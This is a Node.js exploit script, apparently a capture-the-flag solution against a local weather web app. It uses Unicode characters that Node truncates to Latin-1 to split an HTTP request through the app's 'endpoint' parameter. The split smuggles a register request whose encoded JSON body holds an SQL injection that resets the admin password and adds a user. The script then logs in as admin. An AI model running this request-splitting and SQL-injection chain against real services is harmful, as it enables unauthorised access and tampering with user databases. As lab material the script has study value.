var request = require('request');

var header = "127.0.0.1/\u{0120}HTTP/1.1\
\u{010D}\u{010A}\u{010D}\u{010A}\
POST\u{0120}http://127.0.0.1/register\u{0120}HTTP/1.1\
\u{010D}\u{010A}\
Host:\u{0120}127.0.0.1\
\u{010D}\u{010A}\
Content-Type:\u{0120}application/json\
\u{010D}\u{010A}\
Content-Length:\u{0120}"

// fucking use this shit https://dencode.com/en/string/unicode-escape and regex replace (\\u)[0-f]{2}([0-f]{2}) -> $1{01$2}
var body = "\u{017b}\u{0122}\u{0175}\u{0173}\u{0165}\u{0172}\u{016e}\u{0161}\u{016d}\u{0165}\u{0122}\u{013a}\u{0122}\u{0162}\u{016f}\u{0162}\u{0122}\u{012c}\u{0122}\u{0170}\u{0161}\u{0173}\u{0173}\u{0177}\u{016f}\u{0172}\u{0164}\u{0122}\u{013a}\u{0122}\u{0161}\u{0173}\u{0164}\u{0166}\u{0161}\u{0173}\u{0164}\u{0166}\u{0127}\u{0129}\u{013b}\u{0155}\u{0150}\u{0144}\u{0141}\u{0154}\u{0145}\u{0120}\u{0175}\u{0173}\u{0165}\u{0172}\u{0173}\u{0120}\u{0153}\u{0145}\u{0154}\u{0120}\u{0170}\u{0161}\u{0173}\u{0173}\u{0177}\u{016f}\u{0172}\u{0164}\u{0120}\u{013d}\u{0120}\u{0127}\u{0161}\u{0164}\u{016d}\u{0169}\u{016e}\u{0127}\u{0120}\u{0157}\u{0148}\u{0145}\u{0152}\u{0145}\u{0120}\u{0175}\u{0173}\u{0165}\u{0172}\u{016e}\u{0161}\u{016d}\u{0165}\u{0120}\u{013d}\u{0120}\u{0127}\u{0161}\u{0164}\u{016d}\u{0169}\u{016e}\u{0127}\u{013b}\u{0149}\u{014e}\u{0153}\u{0145}\u{0152}\u{0154}\u{0120}\u{0149}\u{014e}\u{0154}\u{014f}\u{0120}\u{0175}\u{0173}\u{0165}\u{0172}\u{0173}\u{0120}\u{0128}\u{0175}\u{0173}\u{0165}\u{0172}\u{016e}\u{0161}\u{016d}\u{0165}\u{012c}\u{0120}\u{0170}\u{0161}\u{0173}\u{0173}\u{0177}\u{016f}\u{0172}\u{0164}\u{0129}\u{0120}\u{0156}\u{0141}\u{014c}\u{0155}\u{0145}\u{0153}\u{0120}\u{0128}\u{0127}\u{016a}\u{0161}\u{016e}\u{0165}\u{0127}\u{012c}\u{0120}\u{0127}\u{0161}\u{0173}\u{0164}\u{0166}\u{0161}\u{0173}\u{0164}\u{0166}\u{0122}\u{017d}"

var suffix = "\u{010D}\u{010A}\u{010D}\u{010A}\u{010D}\u{010A}\
GET\u{0120}"

var exploit_str = header + (Buffer.from(body, 'latin1').length).toString() + "\u{010D}\u{010A}\u{010D}\u{010A}" + body + suffix
var endpoint_str = Buffer.from(exploit_str, 'latin1').toString()
console.log(endpoint_str)

var options = {
  uri: 'http://127.0.0.1:8080/api/weather',
  method: 'POST',
  json: {
    "endpoint": exploit_str,
    "city": "Columbus",
    "country": "USA" 
  }
};

request(options, function (error, response, body) {
  if (!error && response.statusCode == 200) {
    console.log(body)
  }else{
    console.log("oop");
  }
});

options = {
  uri: 'http://127.0.0.1:8080/login',
  method: 'POST',
  json: {
    "username": "admin",
    "password": "admin"
  }
};

request(options, function (error, response, body) {
  if (!error && response.statusCode == 200) {
    console.log(body)
  }else{
    console.log("oop");
  }
});